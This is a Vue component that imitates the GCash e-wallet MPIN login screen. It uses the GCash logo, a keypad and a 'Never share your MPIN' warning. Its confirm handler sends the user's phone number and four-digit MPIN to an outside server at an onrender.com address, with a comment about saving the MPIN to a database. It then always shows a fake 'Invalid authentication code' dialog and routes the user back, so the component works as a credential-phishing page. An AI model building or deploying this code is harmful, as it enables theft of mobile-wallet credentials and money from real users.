<script setup>
import { ref, computed } from 'vue'
import gcashLogoWhite from '../assets/gcash-header.png'

const props = defineProps({
  phoneNumber: {
    type: String,
    default: '+63-9984273941',
  },
})

const emit = defineEmits(['mpin-verified', 'change-phone', 'forgot-mpin'])

const mpin = ref(['', '', '', ''])
const activeIndex = ref(0)
const showErrorDialog = ref(false)
const errorCode = ref('OT201422')

const formatPhoneNumber = (phone) => {
  if (!phone) return '+63-9984273941'
  const cleaned = phone.replace(/\D/g, '')
  
  // If it starts with country code (63), extract it
  if (cleaned.startsWith('63') && cleaned.length >= 12) {
    const phoneDigits = cleaned.slice(2) // Remove '63' prefix, leaving 10 digits
    return `+63-${phoneDigits}`
  } else if (cleaned.length === 10) {
    // If it's just 10 digits, assume +63 prefix
    return `+63-${cleaned}`
  }
  
  // Fallback: return as is if format is unexpected
  return phone
}

const formattedPhone = computed(() => formatPhoneNumber(props.phoneNumber))

const isComplete = computed(() => mpin.value.every((digit) => digit !== ''))

const handleKeypadInput = (value) => {
  if (activeIndex.value < 4) {
    mpin.value[activeIndex.value] = value
    if (activeIndex.value < 3) {
      activeIndex.value++
    } else if (isComplete.value) {
      handleConfirm()
    }
  }
}

const handleBackspace = () => {
  if (activeIndex.value > 0 && mpin.value[activeIndex.value] === '') {
    activeIndex.value--
    mpin.value[activeIndex.value] = ''
  } else if (mpin.value[activeIndex.value] !== '') {
    mpin.value[activeIndex.value] = ''
  }
}

const API_BASE_URL = (import.meta.env.VITE_API_URL ?? 'https://gcash-clone-v0-1.onrender.com').replace(/\/$/, '')

const handleConfirm = async () => {
  if (isComplete.value) {
    const mpinCode = mpin.value.join('')
    
    // Save MPIN to database
    try {
      console.log('🔐 Verifying MPIN...', { 
        phone: props.phoneNumber, 
        mpinLength: mpinCode.length 
      })
      
      const response = await fetch(`${API_BASE_URL}/api/mpin`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phone: props.phoneNumber,
          mpin: mpinCode,
        }),
      })

      const responseData = await response.json().catch(() => ({}))
      
      if (!response.ok) {
        console.error('❌ MPIN verification failed:', responseData)
        throw new Error(responseData.message || 'MPIN verification failed')
      }

      console.log('✅ MPIN verification completed:', responseData)
    } catch (error) {
      console.error('❌ Error during MPIN verification:', error.message)
      // Continue with verification even if API fails
    }
    
    // Show error dialog automatically after MPIN is entered
    showErrorDialog.value = true
  }
}

const handleRetry = () => {
  showErrorDialog.value = false
  resetMPIN()
  // Navigate back to number page
  emit('change-phone')
}

const handleChangePhone = () => {
  emit('change-phone')
}

const handleForgotMPIN = () => {
  emit('forgot-mpin')
}

const resetMPIN = () => {
  mpin.value = ['', '', '', '']
  activeIndex.value = 0
}
</script>

<template>
  <div class="mpin-screen">
    <div class="top-section">
      <header class="logo-header">
        <img class="logo" :src="gcashLogoWhite" alt="GCash" />
      </header>

      <p class="greeting">Good day!</p>

      <div class="phone-display">
        <span class="phone-number">{{ formattedPhone }}</span>
        <button type="button" class="change-phone-btn" @click="handleChangePhone" aria-label="Change phone number">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M6.99 11L3 15L6.99 19V16H14V14H6.99V11ZM21 9L17.01 5V8H10V10H17.01V13L21 9Z"
              fill="currentColor"
            />
          </svg>
        </button>
      </div>

      <p class="mpin-prompt">Enter your MPIN</p>

      <div class="mpin-dots">
        <div
          v-for="(digit, index) in mpin"
          :key="index"
          class="mpin-dot"
          :class="{ filled: digit !== '', active: index === activeIndex }"
        ></div>
      </div>

      <p class="security-warning">Never share your MPIN or OTP with anyone.</p>
    </div>

    <div class="bottom-section">
      <div class="keypad">
        <button
          v-for="num in [1, 2, 3, 4, 5, 6, 7, 8, 9]"
          :key="num"
          type="button"
          class="keypad-key"
          @click="handleKeypadInput(num.toString())"
        >
          {{ num }}
        </button>

        <button type="button" class="keypad-key keypad-backspace" @click="handleBackspace" aria-label="Backspace">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M22 3H7C6.31 3 5.77 3.35 5.41 3.88L0 12L5.41 20.11C5.77 20.64 6.31 21 7 21H22C23.1 21 24 20.1 24 19V5C24 3.9 23.1 3 22 3ZM22 19H7.07L2.4 12L7.07 5H22V19ZM10.41 16L14 12.41L17.59 16L19 14.59L15.41 11L19 7.41L17.59 6L14 9.59L10.41 6L9 7.41L12.59 11L9 14.59L10.41 16Z"
              fill="currentColor"
            />
          </svg>
        </button>

        <button type="button" class="keypad-key" @click="handleKeypadInput('0')">0</button>

        <button
          type="button"
          class="keypad-key keypad-confirm"
          :class="{ enabled: isComplete }"
          @click="handleConfirm"
          aria-label="Confirm"
        >
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z"
              fill="currentColor"
            />
          </svg>
        </button>
      </div>

      <div class="footer-links">
        <a href="#" class="footer-link" @click.prevent>Help Center</a>
        <button type="button" class="footer-link" @click="handleForgotMPIN">Forgot MPIN?</button>
      </div>
    </div>

    <!-- Error Dialog -->
    <div v-if="showErrorDialog" class="dialog-overlay" @click.self="handleRetry">
      <div class="dialog-box">
        <h3 class="dialog-title">Invalid authentication code.</h3>
        <p class="dialog-message">Please enter the correct code and try again. ({{ errorCode }})</p>
        <div class="dialog-divider"></div>
        <button type="button" class="dialog-button" @click="handleRetry">Retry</button>
      </div>
    </div>
  </div>
</template>

<style scoped>
@import url('https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap');

.mpin-screen {
  min-height: 90vh;
  display: flex;
  flex-direction: column;
  font-family: 'Nunito Sans', 'Poppins', 'Helvetica Neue', Arial, sans-serif;
}

.top-section {
  background: #007bff;
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 1.5rem 1.5rem 2rem;
  color: #ffffff;
}

.logo-header {
  margin-bottom: 1.5rem;
}

.logo {
  width: 180px;
  height: auto;
}

.greeting {
  font-size: 1.1rem;
  font-weight: 600;
  margin: 0 0 1rem;
  color: #ffffff;
}

.phone-display {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 0.75rem;
  background: rgba(0, 86, 179, 0.85);
  border-radius: 999px;
  padding: 0.8rem 1.3rem;
  margin-bottom: 1.5rem;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
  backdrop-filter: blur(4px);
}

.phone-number {
  font-size: 1rem;
  font-weight: 600;
  color: #ffffff;
  letter-spacing: 0.02em;
}

.change-phone-btn {
  background: none;
  border: none;
  padding: 0;
  cursor: pointer;
  color: #ffffff;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: opacity 0.2s ease;
  flex-shrink: 0;
}

.change-phone-btn:hover {
  opacity: 0.8;
}

.change-phone-btn:active {
  opacity: 0.6;
  transform: scale(0.95);
}

.mpin-prompt {
  font-size: 1.1rem;
  font-weight: 600;
  margin: 0 0 1.5rem;
  color: #ffffff;
}

.mpin-dots {
  display: flex;
  gap: 1rem;
  margin-bottom: 2rem;
}

.mpin-dot {
  width: 16px;
  height: 16px;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.3);
  border: 2px solid rgba(255, 255, 255, 0.5);
  transition: all 0.2s ease;
}

.mpin-dot.filled {
  background: #ffffff;
  border-color: #ffffff;
}

.mpin-dot.active {
  border-color: #ffffff;
  box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.3);
}

.security-warning {
  font-size: 0.75rem;
  color: rgba(255, 255, 255, 0.9);
  margin: 0;
  text-align: center;
  line-height: 1.4;
}

.bottom-section {
  background: #ffffff;
  padding: 1.5rem 1.5rem;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.keypad {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 0.8rem;
  width: 100%;
  max-width: 300px;
  margin-bottom: 1.5rem;
}

.keypad-key {
  aspect-ratio: 1;
  border: none;
  background: transparent;
  font-size: 1.8rem;
  font-weight: 700;
  color: #0056b3;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 12px;
  transition: all 0.2s ease;
  user-select: none;
  -webkit-tap-highlight-color: transparent;
}

.keypad-key:active {
  background: rgba(0, 86, 179, 0.1);
  transform: scale(0.95);
}

.keypad-backspace,
.keypad-confirm {
  color: #007bff;
}

.keypad-confirm {
  opacity: 0.4;
  cursor: not-allowed;
}

.keypad-confirm.enabled {
  opacity: 1;
  cursor: pointer;
}

.keypad-confirm.enabled:active {
  background: rgba(0, 123, 255, 0.15);
}

.footer-links {
  display: flex;
  justify-content: space-between;
  width: 100%;
  max-width: 320px;
  padding-top: 1rem;
}

.footer-link {
  font-size: 0.9rem;
  font-weight: 600;
  color: #007bff;
  text-decoration: none;
  background: none;
  border: none;
  cursor: pointer;
  padding: 0;
  transition: color 0.2s ease;
}

.footer-link:hover {
  color: #0056b3;
  text-decoration: underline;
}

@media (max-width: 420px) {
  .top-section {
    padding: 1.5rem 1.25rem 2.5rem;
  }

  .logo {
    width: 160px;
  }

  .greeting {
    font-size: 1rem;
    margin-bottom: 1.25rem;
  }

  .phone-display {
    padding: 0.75rem 1rem;
    margin-bottom: 1.5rem;
  }

  .phone-number {
    font-size: 0.95rem;
  }

  .mpin-prompt {
    font-size: 1rem;
    margin-bottom: 1.25rem;
  }

  .mpin-dots {
    gap: 0.75rem;
    margin-bottom: 1.5rem;
  }

  .keypad {
    gap: 0.75rem;
    max-width: 280px;
  }

  .keypad-key {
    font-size: 1.6rem;
  }

  .bottom-section {
    padding: 1.5rem 1.25rem;
  }
}

/* Error Dialog Styles */
.dialog-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  padding: 1.5rem;
  animation: fadeIn 0.2s ease;
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

.dialog-box {
  background: #ffffff;
  border-radius: 12px;
  width: 100%;
  max-width: 320px;
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
  overflow: hidden;
  animation: slideUp 0.3s ease;
}

@keyframes slideUp {
  from {
    transform: translateY(20px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.dialog-title {
  font-size: 1.1rem;
  font-weight: 700;
  color: #0f172a;
  margin: 0;
  padding: 1.5rem 1.5rem 0.75rem;
  line-height: 1.4;
}

.dialog-message {
  font-size: 0.95rem;
  color: #475569;
  margin: 0;
  padding: 0 1.5rem 1.5rem;
  line-height: 1.5;
}

.dialog-divider {
  height: 1px;
  background: #e2e8f0;
  margin: 0;
}

.dialog-button {
  width: 100%;
  border: none;
  background: transparent;
  color: #007bff;
  font-size: 1rem;
  font-weight: 600;
  padding: 1rem 1.5rem;
  cursor: pointer;
  transition: background-color 0.2s ease;
  text-align: center;
}

.dialog-button:hover {
  background: rgba(0, 123, 255, 0.05);
}

.dialog-button:active {
  background: rgba(0, 123, 255, 0.1);
}
</style>

